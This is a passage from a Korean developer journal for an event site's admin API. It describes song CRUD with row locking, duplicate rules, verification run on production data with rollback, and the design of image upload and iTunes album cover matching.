컨트롤러를 둘로 나눴다(`TeamSongsController` / `SongsController`). 조회·등록은 팀이 항상 정해져 있어 중첩이 자연스럽지만, 수정은 곡 id 하나로 이미 유일하게 지목되므로 중첩하면 `:teamId`와 실제 소속을 대조하는 분기만 늘어난다.

**2) 팀 행 잠금** — 등록·수정 트랜잭션의 **첫 단계**에서 대상 팀 행을 `SELECT id FROM "Line Up" WHERE id = $1 FOR NO KEY UPDATE`로 잠그고, 0행이면 404. 존재 확인만으로는 더블클릭(거의 동시 요청) 두 건이 중복 검사를 **함께 통과**한다.

**3) 중복 판정 규칙** — 같은 팀 안에서 `NFC 정규화 → trim → 소문자` 비교. `singer`가 NULL이면 빈 문자열로 취급한다. **비교에만 적용하고 저장값은 DTO의 trim까지만** 적용한다. 수정은 **수정 후 값** 기준이고 자기 자신은 제외하므로, 같은 값으로 다시 보내면 409가 아니라 200이다.

**4) 응답 계약 (`dto/song-response.ts`)** — §11과 같은 매퍼 방식. `albumCoverUrl`·`youtubeUrl`은 응답에만 싣고 입력 DTO에는 넣지 않았다(보내면 400).

**5) `mapForeignKeyViolation` 추가 (`src/common/prisma-error.ts`)** — `P2003` → 404.

### 기술 판단

| 쟁점 | 선택 | 이유 |
| --- | --- | --- |
| **경로 구조** | **조회·등록은 팀 하위 중첩, 수정은 평탄** (`/teams/:teamId/songs`, `/songs/:id`) | PRD 흐름이 "팀 선택 → 해당 팀 패널"이라 조회·등록 시 팀이 항상 정해져 있다. 중첩하면 `teamId`가 타입 수준에서 필수가 되고 본문에서 사라져 **곡의 팀을 옮기는 경로가 구조적으로 존재하지 않게 된다**. 수정까지 중첩하면 `:teamId`와 실제 소속이 어긋난 요청을 처리하는 분기가 생기는데, 곡 id만으로 이미 유일하게 지목되므로 순수한 비용이다 |
| **곡 정렬** | **`id` 오름차순** (순서 컬럼 추가 ✗) | 공개 프론트가 id 순으로 읽어 그대로 렌더링한다. 관리자 화면이 다른 순서를 보여주면 "관리자에서 본 순서"와 "방문자가 보는 순서"가 갈린다. 순서 컬럼 추가는 프로덕션 마이그레이션이고 이번 스코프 밖이라, **중간 삽입·재정렬 불가**를 한계로 명시하고 넘긴다 |
| **같은 팀 동일 곡** | **409 거부** (허용 ✗) | 허용하면 공개 프론트가 뒤 행을 조용히 버려 "관리자엔 있는데 사이트엔 없는 곡"이 된다. 게다가 순서 컬럼이 없어 동일한 두 행은 **애초에 구분할 방법이 없다**. 등록 버튼 더블클릭이 실제 위험이라 잠금까지 함께 넣었다 |
| **중복 비교 규칙** | **NFC + trim + 소문자**, 비교 전용 | 프론트는 대소문자를 구분하지만 API를 더 엄격하게 두는 쪽이 안전하다 — 관리자 화면에서 `Butterfly`와 `butterfly`는 구분되지 않는다. NFC를 거는 이유는 자모가 분리된 한글(macOS 복사 등)이 눈에 같아 보여도 코드 포인트가 달라 판정을 빠져나가기 때문이다. **저장값에는 적용하지 않는다** — 관리자가 입력한 표기를 API가 임의로 바꾸면 안 된다 |
| **동시 등록 방어** | **`FOR NO KEY UPDATE` 행 잠금** (DB unique 제약 ✗, 확인-후-삽입만 ✗) | "확인 후 삽입"은 트랜잭션 안에 있어도 **동시 요청을 막지 못한다** — Read Committed에서 두 트랜잭션이 서로의 미커밋 INSERT를 보지 못하기 때문이다. `(teamId, title, singer)` unique 제약은 대소문자·NFC 정규화까지 담으려면 표현식 인덱스가 필요하고 프로덕션 마이그레이션이 되므로 이번엔 하지 않았다. 팀 행을 잠그면 **같은 팀에 대한 쓰기가 직렬화**되어 뒤 요청이 앞 요청의 커밋 결과를 보고 409로 떨어진다 |
| **`FOR UPDATE`가 아닌 이유** | **`FOR NO KEY UPDATE`** | 이 잠금의 목적은 팀 행의 **삭제·키 변경을 막는 것**이지 팀 정보 수정을 막는 것이 아니다. `FOR UPDATE`를 쓰면 같은 팀의 팀명을 바꾸는 `PATCH /teams/:id`와 불필요하게 경합한다 |
| **수정 시 `albumCoverUrl`/`youtubeUrl`** | **유지** (초기화 ✗) | 이 엔드포인트는 "오타 교정"과 "다른 곡으로 교체"를 구분할 수 없는데 두 경우의 비용이 비대칭이다. 앨범 커버는 F010으로 즉시·무료로 다시 받을 수 있지만, 승인된 유튜브 링크는 **사람 검토 + 일일 100회 quota**가 든 자산이고 현재 64곡 중 5건뿐이다. 오래된 커버는 눈에 보이는 경미한 오류, 잃어버린 링크는 **보이지 않는 손실**이다. 교체 의도일 때의 재매칭은 F010/F013에서 명시적 동작으로 처리한다 |
| **없는 팀의 GET** | **404** (빈 배열 ✗) | 곡 0건인 팀이 **정상 상태**다(팀 등록 직후는 항상 0건). 빈 배열로 합치면 관리자 UI가 "잘못된 팀 id"와 "아직 곡 없음"을 구분할 수 없다 |
| **`singer` 필수 여부** | **등록 시 필수**, 수정 시 optional(보냈다면 비울 수 없음) | 실제 64행이 전부 채워져 있고, 비면 공개 페이지가 `"SUMMIT Band"`로 **잘못된 정보를 노출**한다. F010도 제목+가수를 함께 쓴다. 대신 이 API로는 `singer`를 NULL로 되돌릴 수 없다(의도된 한계) |
| **길이 상한** | title 200 / singer 100 | DB가 `text`라 무제한이다. 실제 최댓값(24/21)보다 크게 잡아 **기존 64행이 전부 통과**하면서도 비정상적으로 긴 본문은 DB에 닿기 전에 막는다 |
| **BigInt 매퍼** | **§11 방식 반복** (공용 헬퍼 추출 ✗) | 공유되는 로직이 `id.toString()` 한 줄뿐이라 헬퍼를 빼도 모델별 매퍼는 그대로 남는다 — 간접 계층만 는다. §11이 6단계로 이월한 것은 **인터셉터 재판단**이고, 매퍼가 2개가 된 지금은 아직 그 시점이 아니다 |
| **Prisma 에러 매핑** | `P2002` → 409, `P2003` → 404, `P2025` → 404 | 도달 경로 기준으로 판단했다 — 아래 트러블슈팅 2번 참조 |

### 검증

**단위 테스트 133개** (`npm test`, 이전 78개 + 이번 55개). §11과 같이 `PrismaService`만 대역으로 두되 작은 인메모리 저장소로 동작까지 흉내 냈고, 행 잠금용 `$queryRaw`는 태그드 템플릿 형태로 mock했다.

- `findAllByTeam`: `id` asc 정렬 인자 / 곡 0건 팀은 빈 배열 / 없는 팀은 404(조회조차 하지 않음) / id·teamId 문자열화 / JSON 직렬화
- `create`: 정상 등록 / 없는 팀 404(`create` 미호출) / 완전 동일·대소문자·NFD 중복 409 / 다른 팀의 같은 곡은 허용 / 같은 팀이라도 가수가 다르면 허용 / **잠금이 중복 검사보다 먼저 호출됨**(`invocationCallOrder` 비교) / 쿼리에 `FOR NO KEY UPDATE`와 `"Line Up"`이 포함됨 / `P2002` → 409 / `P2003` → 404 / 트랜잭션 1회
- `update`: 제목만 수정 시 가수 불변 / **앨범 커버·유튜브 링크 보존** / `data`에 `teamId` 없음 / 같은 값 재전송은 200 / 대소문자만 바꾸기 200(자기 자신 제외) / 다른 곡과 겹치면 409 / **부분 수정도 수정 후 값 기준** / `teamId`가 NULL이면 중복 검사 건너뜀 / 404 / 빈 본문 400(트랜잭션 미개시) / `P2025` → 404
- 컨트롤러: **두 클래스와 세 핸들러에 `isPublic` 메타데이터 없음**, 경로·메서드 메타데이터, BigInt 파라미터 위임
- DTO: 전역 파이프와 **동일한 옵션**으로 재현해 trim, 빈 문자열 거부, 상한 200/101 경계, `teamId`/`albumCoverUrl`/`youtubeUrl` 주입 거부

**런타임 검증 101개 체크, 실패 0** (`node dist/main.js`, 포트 3002 — §11과 같은 이유로 3001과 분리).

| 구간 | 내용 | 결과 |
| --- | --- | --- |
| A1 | 3개 엔드포인트 × (토큰 없음 / 위조 서명 / 만료 / Bearer 아님) | 전부 `401 인증이 필요합니다.` |
| A1 | `GET /health` | `200` — 공개 유지 (회귀 없음) |
| A2 | POST DTO 거부 13종(누락·공백·타입·상한·필드 주입) | 전부 `400` |
| A3 | PATCH DTO 거부 7종(빈 본문·`teamId`·`albumCoverUrl`·`youtubeUrl` 등) | 전부 `400` |
| A4 | `:teamId`/`:id` 파싱(`abc`/`0`/`-1`/`1.5`/int8 초과) | 전부 `400` |
| A5 | 없는 팀 GET·POST, 없는 곡 PATCH | `404` ×3 |
| A6 | 거부 구간 직후 스냅샷 | **diff 0** |
| A7 | 실제 팀 **15개 전부** GET → 직접 SQL 결과와 필드 단위 비교 | 전부 일치, 곡 수 합계 **64**, 스냅샷 **diff 0** |
| B1 | 임시 팀 생성, 곡 0건 팀의 빈 배열, 없는 팀 404와의 구분, 거부 3종 | 기대값 일치, `Setlist` **64행 유지** |
| B2 | 등록 / 완전 동일·대소문자·공백·NFD 중복 409 / 제목 다르면 등록 | 전부 기대값 일치 |
| B2 | **동일 payload 동시 요청 2건** (`Promise.all`) | `201` 1건 + `409` 1건, **곡 1행만 생성** |
| B2 | 조회 정렬, 앨범/유튜브 보존, 같은 값 200, 충돌 409, 부분 수정 409, 대소문자 변경 200 | 전부 기대값 일치 |
| C | 임시 행 삭제 후 복구 | `Line Up` **15행** / `Setlist` **64행** / `teamId` 매칭 **64/64** / 스냅샷 **diff 0** / `day98`·`__verify__` 잔존 **0** |

**프로덕션 데이터 보호 절차** (별도 테스트 DB가 없어 프로덕션에 직접 검증했다)

- **쓰기가 없는 A 구간을 전부 먼저** 실행하고 스냅샷 diff 0을 확인한 뒤 쓰기로 넘어갔다. 실제 팀 15개에 대해서는 **GET만** 수행했고 곡 64행은 한 건도 수정하지 않았다
- **§11과 달라진 점**: 이번엔 임시 팀에 곡을 만들어야 해서 `/event-goods`의 "곡 0건" 필터를 통과한다. 곡 생성 직전에 멈추고 노출 경로를 코드 근거와 함께 보고한 뒤 승인을 받았다 (아래 "검증 게이트" 참조)
- 곡이 필요 없는 검증(B1)을 먼저 끝내고, **곡을 만드는 구간(B2)은 스크립트 한 번에 몰아서** 실행했다. 임시 곡은 3건만 사용
- 앨범 커버·유튜브 보존 검증에 값이 필요해서 **이번 실행에서 만든 임시 행에만** SQL로 값을 심었다. 실제 곡에는 쓰지 않았다
- 정리는 `try/finally`. 삭제 순서는 `Setlist` → `Line Up`(FK가 `NoAction`), 삭제 조건은 **이번 실행에서 생성한 id 목록 AND `team_name='__verify__'` AND `day='day98'`**. 추적하지 못한 잔존 행이 없는지 삭제 후 별도로 확인(0건)
- 스냅샷은 레포 바깥(세션 스크래치패드)에 저장했다
- **시퀀스는 되돌리지 않았다.** 소모된 id는 `Line Up` **20번 1개**, `Setlist` **65~67번 3개**다. 되감으면 향후 id 재사용 위험이 생긴다

**검증 게이트 — `__verify__` 팀의 실제 노출 경로**

곡을 만들기 전에 아래를 코드 근거로 보고하고 승인을 받았다.

- `event-goods/page.tsx:35-38` — `day='day98'`은 어떤 리터럴과도 일치하지 않아 id 폴백으로 내려가고, 임시 팀 id가 20이므로 `id >= 8` → **2일차로 분류**된다
- `event-goods/page.tsx:72` — `image_src`가 NULL이라 `getImageFallbackPath(20)`이 **`/day1-team1.png`(8C8 사진)** 을 돌려준다
  - > **정정 (2026-09-20, §13 조사)**: 이 값은 계산될 뿐 **화면에 그려지지 않는다.** `event-goods-view.tsx:63-70`이 `coverShape === "square"`(= `album` 없음)이면 `SquareGrayArtwork`로 분기해 `team.imageSrc`를 쓰지 않기 때문이다. 당시 보고에서 "8C8 사진이 뜬다"고 한 것은 렌더링 분기를 확인하지 않은 추정이었다. 실제 노출은 **팀명과 곡 목록**이다.
- `event-goods-view.tsx:19` — `tracks.length > 0`인 팀만 렌더링하므로, **곡을 만드는 순간 이 필터를 통과**한다
- 두 페이지 모두 `revalidate`/`dynamic` 선언이 없고 `supabase.ts:17`이 `cache: "no-store"`라 **매 요청 실시간 조회**다 → 배포본에 그대로 반영된다
- `setlist/page.tsx:147-150`은 `id <= 14` 상한이 있어 `null` → **`/setlist`에는 노출되지 않는다**
- `card-carousel.tsx:215`는 `image_src`가 비면 제외 → **홈 캐러셀에도 노출되지 않는다**

**실측 노출 창**: 첫 곡 생성 `13:55:33.152Z` → 마지막 곡 삭제 `13:55:33.764Z`, **0.6초**. (곡이 0건인 임시 팀 자체는 `13:54:27Z`~`13:55:33Z` 약 66초간 존재했지만, 위 필터 때문에 화면에는 나오지 않고 서버→클라이언트 페이로드에만 포함된다 — §11이 확인한 것과 같은 상태다.)

**회귀 없음** — 루트 `npm run build`(Next.js 프로덕션 빌드) / `npm run lint`, `apps/api` `npm run build` / `npm run lint` / `npm test` 모두 정상.

**엔드투엔드 로그인은 이번에도 미수행** — 관리자 비밀번호를 주고받지 않는다는 원칙에 따라 `JWT_SECRET`으로 로컬에서 직접 서명한 토큰을 사용했다(§10·§11과 동일).

### 트러블슈팅 기록

**1) "확인 후 삽입"만으로는 더블클릭을 막지 못한다**

초안 설계에서는 등록 트랜잭션을 `팀 존재 확인 → 중복 검사 → INSERT`로 잡고, 남는 레이스는 "관리자 1인 전제라 수용"하기로 했다. 이 판단이 느슨했다. 등록 버튼 더블클릭은 **관리자가 한 명이어도 발생하는 거의 동시 요청**이고, Read Committed에서 두 트랜잭션은 서로의 미커밋 INSERT를 보지 못하므로 중복 검사를 **나란히 통과**한다. `(teamId, title, singer)`에 unique 제약이 없으니 DB가 잡아 주지도 않는다.

교정: 트랜잭션 첫 단계를 **팀 행 잠금**으로 바꿨다.

```sql
SELECT id FROM "Line Up" WHERE id = $1 FOR NO KEY UPDATE
```

같은 팀에 대한 등록·수정이 이 지점에서 직렬화되므로, 뒤 요청은 앞 요청이 커밋한 곡을 보고 409로 떨어진다. 런타임 검증에서 동일 payload를 `Promise.all`로 동시에 보내 **201 1건 + 409 1건, 실제 생성 1행**을 확인했다.

수정(`PATCH`)에도 같은 잠금을 걸었다. 등록만 잠그면 "수정과 등록이 동시에 일어나는 경우"가 그대로 열려 있어 불변식이 반쪽이 된다.

**2) `P2003`의 도달 경로를 잠금 도입 후 다시 판단함**

설계 단계에서는 `P2003`(FK 위반)을 "등록의 존재 확인과 INSERT 사이에 팀이 외부에서 삭제되면 발생"하는 **도달 가능한 경로**로 봤다. 행 잠금을 넣은 뒤에는 그렇지 않다 — 팀 행이 잠겨 있어 동시 `DELETE`는 우리 트랜잭션이 끝날 때까지 대기하고, 이미 삭제된 뒤라면 잠금 쿼리가 0행을 돌려줘 그 시점에 404가 된다.

그래도 **매핑은 방어용으로 남겼다.** §11에서 "`P2002`는 도달 불가"라고 단정했다가 런타임에서 실제로 터진 선례가 있기 때문이다. "제약을 확인했다"와 "위반될 경로가 없다"는 같은 말이 아니다. 판단을 코드 주석과 이 문서에 **"도달 불가라고 판단하지만 방어용으로 유지"** 로 적어 두는 쪽이, 매핑을 지웠다가 500으로 새는 것보다 낫다.

**3) 409로 거부된 등록은 `nextval`을 소비하지 않는다 (직접 확인)**

§11에서는 "INSERT 이전에 거부되는 409는 시퀀스를 소비하지 않는다"를 **정황 일치**로만 적었다(직전 값을 측정해 두지 않았다). 이번에는 쓰기 전후 시퀀스를 모두 측정했다.

| 시점 | `Setlist_id_seq` |
| --- | --- |
| B2 시작 전 | 64 |
| B2 종료 후 | **67** |

등록 요청은 9건이었고 그중 성공은 3건이다. 시퀀스가 정확히 3만큼 전진했으므로 **거부된 6건은 `nextval`을 소비하지 않았다**. 중복 검사가 INSERT보다 앞에 있기 때문이며, 이번엔 직접 확인한 결과다.

**4) 검증 스크립트의 `.env` 파싱 실수**

검증 스크립트에서 `.env`를 직접 정규식으로 파싱했는데, 이 저장소의 값은 **큰따옴표로 감싸져 있어** 따옴표째 접속 문자열로 들어갔다(`getaddrinfo ENOTFOUND base`). 자체 파서를 버리고 `node --env-file=<apps/api>/.env`로 교체했다. 검증 도구 쪽 실수라 API 코드에는 영향이 없지만, **"환경 변수를 직접 파싱하지 말 것"** 은 6~7단계 스크립트에도 그대로 적용된다.

### 이 단계에서 의도적으로 하지 않은 것

- **곡 삭제 API** — PRD MVP 제외. 학기 단위 통째 갱신 전제이고 오입력은 수정으로 대응한다(팀 삭제를 만들지 않은 것과 같은 이유). 다만 "다른 곡으로 교체"가 수정으로만 가능해진다는 점은 위 `albumCoverUrl` 유지 판단과 함께 봐야 한다
- **곡 순서 변경 / 중간 삽입** — `Setlist`에 순서 컬럼이 없고 추가하려면 프로덕션 마이그레이션이 필요하다. 공개 프론트가 `id` asc로 읽는 이상 **새 곡은 항상 맨 뒤**다. 실제로 순서를 바꿔야 하는 요구가 생기면 그때 컬럼을 추가한다(아래 이월 항목)
- **곡의 팀 이동(`teamId` 수정)** — 경로가 소속을 정하고 DTO에 `teamId`가 없어 **구조적으로 불가능**하다. 보내면 `forbidNonWhitelisted`가 400
- **곡 일괄 등록(벌크)** — 지금 필요한 곳이 없다. work03 콘텐츠 마이그레이션에서 대량 삽입이 필요해지면 그때 만들되, **id를 명시하지 않고 삽입**해야 §11 트러블슈팅 1번(시퀀스 뒤처짐)이 재발하지 않는다
- **앨범 커버 자동 매칭(F010)** — 같은 4단계 범위였지만 이번 작업에서 분리했다. `albumCoverUrl`은 **읽기 전용 응답**에만 포함하고 입력 DTO에는 넣지 않았다(보내면 400). iTunes Search API 연동은 분당 rate limit과 매칭 실패 처리 설계가 따로 필요하다
- **유튜브 배치 검색·리뷰(F011~F013)** — 6단계. `youtubeUrl`도 읽기 전용 응답만
- **`Setlist.youtubeReviewStatus` 컬럼 추가** — 6단계로 이월(§10 갱신). 컬럼만 먼저 만들면 **아무도 읽지 않는 상태 값이 프로덕션 스키마에 남는다**. 기능과 함께 추가한다
- **`(teamId, title, singer)` DB unique 제약** — 대소문자·NFC 정규화까지 담으려면 표현식 인덱스가 필요하고 프로덕션 마이그레이션이 된다. 불변식은 행 잠금 + 애플리케이션 검사로 보장한다
- **`Setlist.teamId` 인덱스** — 64행이라 의미가 없다. work03에서 행이 크게 늘면 재검토
- **카드뉴스 업로드(F007) / throttler / CORS** — §10·§11의 판단 유지. 5단계와 7단계 항목이다
- **`/event-goods` id 범위 폴백 수정** — 프론트 스코프. 이번 브랜치에서 건드리지 않기로 명시적으로 합의했고, §10 "7단계 배포 전 확인 항목"에 기록된 상태를 유지한다

### 남겨둔 결정 (5단계 이후로 이월)

- **곡 순서 컬럼** — 지금은 `id` asc가 곧 공연 순서다. 중간 삽입이나 순서 교체가 필요해지는 시점에 `Setlist`에도 `performanceOrder`를 추가하고, **공개 프론트의 정렬도 함께** 바꿔야 한다(`src/lib/fetch-line-up-and-setlist.ts`의 `.order("id")`). 한쪽만 바꾸면 관리자와 방문자가 다른 순서를 본다
- **남는 레이스** — 팀 행 잠금으로 **같은 팀에 대한 등록·수정 경합은 닫혔다.** 남은 것은 서로 다른 팀에 대한 동시 쓰기인데, 중복 판정 범위가 팀 내부라 애초에 경합 대상이 아니다. 관리자가 여러 명이 되어도 이 구조는 유지되지만, 잠금이 늘어나면 대기 시간이 문제가 될 수 있어 그 시점에 표현식 unique 인덱스로 옮기는 쪽을 재검토한다
- **BigInt 매퍼의 반복 비용** — §11에서 이월한 항목 유지. 이번에 매퍼가 2개가 됐고, 6단계쯤 인터셉터 방식을 다시 판단한다
- **`singer`를 비우는 경로** — 현재 API로는 NULL로 되돌릴 수 없다. 실제로 가수를 모르는 곡이 들어오면 그때 정책을 정한다(빈 값 허용 vs `"미상"` 같은 규약)
- **`day` 문자열 정렬** — §11에서 이월한 항목 그대로

## 13. work02-5 — 카드뉴스 이미지 업로드(F007) + 앨범 커버 자동 매칭(F010) (2026-09-20)

- **날짜**: 2026-09-20
- **브랜치**: `feature/card-image-album-cover` (`develop`과 같은 커밋 `7ffe7dc`에 있던 작업 브랜치를 `git branch -m`으로 개명. 분기 시점에 로컬 `develop`이 `origin/develop`과 동일함을 확인)
- **관련 PR**: work02-5, `feat: 카드뉴스 이미지 업로드 및 앨범 커버 자동 매칭 API 구현` (푸시/PR 생성은 보류)

### 배경

work02 빌드 순서 5단계, PRD `F007`(카드뉴스 사진 업로드) / `F010`(앨범 커버 자동 매칭). 이번 단계에서 처음으로 **DB 밖의 두 시스템**(Supabase Storage, iTunes Search API)이 들어온다. 그래서 지금까지와 성격이 다른 실패 모드가 생긴다 — "DB는 성공했는데 저장소는 실패", "저장소는 성공했는데 DB가 실패", "외부 API가 느리거나 거절".

두 기능을 한 단계에 묶었지만 모듈·커밋은 분리해서 언제든 두 PR로 쪼갤 수 있게 했다.

### 구현 전 조사에서 드러난 것 (설계를 바꾼 사실들)

| 조사 항목 | 확인된 사실 | 설계에 미친 영향 |
| --- | --- | --- |
| `public/day{1,2}-team*.png` 실제 형식 | 15개 **전부 확장자만 `.png`이고 바이트는 JPEG**(`FF D8 FF`). 819×1024, 85~96KB | 형식 판별을 **매직바이트로만** 하기로 확정. 확장자·Content-Type은 판별에 쓰지 않고, 저장 객체의 확장자도 판별 결과에서 만든다 |
| `Line Up.image_src` 15건 | **전부 `/dayN-teamM.png` 상대경로.** Storage URL도 외부 URL도 0건 | 레거시 값은 Storage 객체가 아니므로 **삭제 대상이 될 수 없다.** 교체는 컬럼 덮어쓰기만 |
| 공개 프론트의 이미지 렌더링 | 홈 캐러셀·`/setlist` 팀 카드 모두 `next/image` + **`unoptimized`**. `normalizeImageSource`는 `https://`를 그대로 통과시킴(구현이 3곳에 복사돼 있음) | **프론트 수정 불필요.** 동시에 "상한이 곧 방문자 다운로드 용량"이라 1MB 상한의 근거가 됨 |
| `next.config.ts` remotePatterns | `**.supabase.co`와 `is1-ssl.mzstatic.com` **정확히 둘만** 허용 | Storage 공개 URL은 이미 매칭 → 수정 불필요. 앨범 커버 allowlist를 `is1-ssl.mzstatic.com` 하나로 맞추는 근거 |
| `Setlist.album` 64건 | 63건이 `is1-ssl.mzstatic.com/.../600x600bb.jpg`(크기 변형 100% 동일), 1건은 레거시 상대경로. 최대 160자 | 저장 형식을 **`600x600bb.jpg`로 고정**. 프론트 `shrinkAlbumCoverUrl`이 이 꼬리표를 112px로 치환하는 구조라 형태가 다르면 축소가 죽는다 |
| Supabase Storage 현황 | 버킷 **0개**. `imageTransformation` 비활성, **`purgeCache` 비활성**, `object_versioning` false, 전역 상한 50MB | 버킷을 새로 제안. **CDN 캐시를 수동으로 비울 수단이 없다**는 것이 덮어쓰기를 버리고 고유 파일명을 택한 결정적 근거 |
| iTunes `country=KR` | 한국어 쿼리는 물론 **영어 대조군(`Dynamite BTS`)까지 전부 `resultCount: 0`**. US·JP는 정상 | `country=US` 고정. 원인은 확인하지 못했고(한국 iTunes Store에 음원 카탈로그가 없기 때문으로 추정) 관측된 사실만 근거로 씀 |
| US 스토어프런트의 표기 | 한국어 곡을 **영문으로 돌려준다** (`빨간 피터`→`Red Peter`, `한로로`→`HANRORO`). 기존 `album` 63건이 US 응답과 바이트 단위로 일치 | **점수·임계값을 두지 않기로 확정.** 한국어 입력과의 문자열 일치도는 대부분 0점이라 숫자에 근거가 없다 → 사람이 고르는 구조 |
| iTunes 응답 필드 | `artworkUrl30/60/100`만 있고 **`artworkUrl600`은 없다.** 임의 치수(112 등) URL도 200 | 600px는 URL 치환으로 만든다. 프론트의 112px 치환이 실제로 동작함도 확인 |
| iTunes rate limit 헤더 | 응답에 `x-ratelimit-*`·`retry-after`가 **전혀 없다.** `Cache-Control: max-age=86400` | 업스트림 거절에 기댈 수 없다 → 우리 쪽 인메모리 상한이 1차 방어 |
| multer / express 기본값 | express의 json·urlencoded 기본 100KB는 **multipart에 적용되지 않고**, multer 기본 `fileSize`는 `Infinity` | 상한을 **앱 레벨에서 명시**. 지정하지 않으면 사실상 무제한 |
| Nest의 multer 에러 처리 | `transformException`이 이미 413/400으로 매핑한다. 단 **메시지가 영어**이고 원본 `MulterError`는 소실 | 상태코드는 문제가 아니었음. `FileInterceptor`를 쓰지 않고 multer를 직접 감싸 **출처가 확정된 자리에서** 한국어로 바꾸기로 함 |
| Supabase 키 체계 | 이 프로젝트는 신규 키 체계가 이미 활성(legacy `anon` + `sb_publishable_…` 공존) → `sb_secret_…` 발급 가능 | legacy `service_role` 대신 secret 키 채택 (아래 기술 판단) |
| 배포 위치 | 레포에 근거 없음(Dockerfile·vercel.json·CI 모두 없고 `apps/api/README.md`는 스캐폴딩 원문) | **미정.** §9의 Session pooler 선택 근거("Nest는 상주 프로세스")와 맞춰 **상주 컨테이너 전제**로 설계하고, 본문 상한은 앱에서 명시 |

### 작업 내용

엔드포인트 3개 추가. 전부 인증 필수(`@Public()` 미부착).

| 메서드 | 경로 | 기능 |
| --- | --- | --- |
| `PUT` | `/teams/:id/card-image` | 카드뉴스 이미지 업로드 (multipart, 필드명 `file`) → `TeamResponse` |
| `GET` | `/songs/:id/album-cover/candidates` | 앨범 커버 후보 조회 (DB 쓰기 없음) |
| `PUT` | `/songs/:id/album-cover` | 선택한 후보 반영 → `SongResponse` |

모듈은 둘로 나눴다. `storage/`(저장소 접근 계약 + Supabase 구현 + 매직바이트 판별)를 `TeamsModule`이 들이고, `album-cover/`(컨트롤러·서비스·iTunes 클라이언트·아웃바운드 상한)는 `SongsModule`과 분리했다 — 곡 CRUD는 DB만 다루는데 이쪽은 외부 API와 호출 상한을 들고 있어서, 섞으면 곡 CRUD 테스트가 외부 의존성까지 끌고 온다.

### 기술 판단

| 쟁점 | 결정 | 이유 |
| --- | --- | --- |
| 업로드 방식 | **API 경유 multipart** (signed upload URL 아님) | signed URL은 브라우저가 저장소에 직접 올려 **서버가 바이트를 못 본다** → 매직바이트 검증이 불가능해진다. 관리자 1인이 학기당 8~15장 올리는 규모라 대용량 최적화의 이점도 없다 |
| 형식 판별 | 매직바이트(JPEG/PNG/WebP), **SVG 제외** | 확장자·Content-Type을 믿을 수 없다는 것이 이 레포 실데이터로 증명돼 있다. SVG는 스크립트를 품는 XML 문서라 public 버킷에서 `*.supabase.co` 오리진으로 서빙되면 저장형 XSS 경로가 된다 |
| 크기 상한 | 앱 **1MB** / 버킷 **2MB** | 기존 최대 95.8KB의 약 11배. 프론트가 `unoptimized`로 원본을 그대로 내려보내므로 상한이 곧 방문자 다운로드 용량이다. 버킷 상한은 앱을 우회한 경로에 대한 백스톱 |
| 파일명 | **업로드마다 고유 경로** `{teamId}/{uuid}.{ext}`, `x-upsert: false` | `purgeCache`가 비활성이라 같은 경로를 덮으면 CDN 엣지의 옛 이미지를 비울 수단이 없다. Supabase 공식 문서도 upsert 대신 새 경로를 권한다. **검증에서 실제로 삭제된 객체가 CDN에서 계속 200으로 나왔다**(아래 트러블슈팅 5) |
| Cache-Control | `max-age=31536000` 명시 전송 | 경로가 매번 새로 생기므로 무한 캐시가 안전하다. 형태를 `public,…,immutable`이 아니라 `max-age=N`으로 둔 것은 storage-js가 실제로 보내는 형태가 그것이고 다른 디렉티브의 보존 여부를 확인하지 못했기 때문. 지정하지 않으면 기본값은 3600초 |
| 이전 객체 | **보존** (삭제하지 않음) | `object_versioning`이 false라 지우면 복구가 안 된다. 삭제 대상 계산이 틀리면 **살아 있는 이미지가 사라지는** 되돌릴 수 없는 사고가 되고, 반대쪽 대가는 90KB짜리 객체가 쌓이는 것뿐이다(Free tier 1GB 기준 1만 장 이상). 레거시 상대경로가 삭제 대상이 되는 경로는 **구조적으로 존재하지 않는다** |
| 외부 I/O 중 DB 잠금 | **잡지 않는다** | §12의 곡 등록이 팀 행을 `FOR NO KEY UPDATE`로 잠근 것은 "같은 팀 안 중복 검사"라는 읽기-쓰기 원자성이 필요했기 때문인데, 여기엔 그런 불변식이 없다(단일 컬럼 덮어쓰기). 잠금을 쥔 채 저장소를 기다리면 같은 팀의 다른 요청이 네트워크 지연만큼 막힌다 |
| 보상 삭제 | **미반영이 확정된 경우에만** 삭제 | DB 오류에는 `P2025`처럼 갱신이 없었던 것이 확실한 경우와, 타임아웃·연결 끊김처럼 **커밋 여부를 모르는** 경우가 있다. 후자에서 바로 지우면 실제로는 커밋된 이미지의 객체를 지워 공개 페이지에 깨진 이미지가 뜬다. 그래서 불명확하면 `image_src`를 재조회하고, 방금 올린 URL이면 유지하며, **재조회마저 실패하면 지우지 않고 고아로 남긴다** |
| 업로드 타임아웃 | 10초, 504. **객체를 지우지 않고 경로만 로그** | 타임아웃은 "실패"가 아니라 "결과를 모름"이다. 지우면 성공한 업로드를 지울 위험이 있다 |
| Storage 자격 | **`sb_secret_…` 신규 발급 1개** (legacy `service_role` 아님, S3 자격 아님) | legacy 키는 유출 시 개별 폐기가 안 되고 레거시 전체를 비활성화해야 하는데, 그러면 **공개 프론트가 쓰는 anon 키까지 같이 죽어 사이트가 내려간다.** S3 자격은 "모든 버킷의 모든 작업"이라 권한 범위가 더 넓고 SDK 의존성까지 필요 |
| Storage 클라이언트 | `@supabase/supabase-js` 없이 **fetch 직접 구현** | 필요한 건 객체 업로드/삭제/조회 셋뿐이다. 요청 형태는 추측하지 않고 `storage-js`의 `StorageFileApi` 소스를 읽어 그대로 재현했다(raw binary body, `x-upsert`, `cache-control: max-age=N`). 인증 헤더는 `apikey`와 `Authorization`을 **둘 다** 보낸다 — 실측 결과 **`Authorization`만으로는 400이고 `apikey`만으로 200**이었다 |
| multer 에러 | `FileInterceptor` 대신 **multer를 직접 감싸고** `MulterError` 인스턴스만 한국어로 치환 | Nest는 multer 에러를 영어 메시지의 `HttpException`으로 이미 바꿔 버려서, 그 뒤에서는 "이 400이 multer에서 왔는지 파이프에서 왔는지" 구분할 수 없다. 상태코드로 판별했다면 `:id` 파싱 400이나 팀 404의 메시지까지 업로드 안내문으로 덮였을 것이다. 분기도 메시지가 아니라 `code`로 한다 |
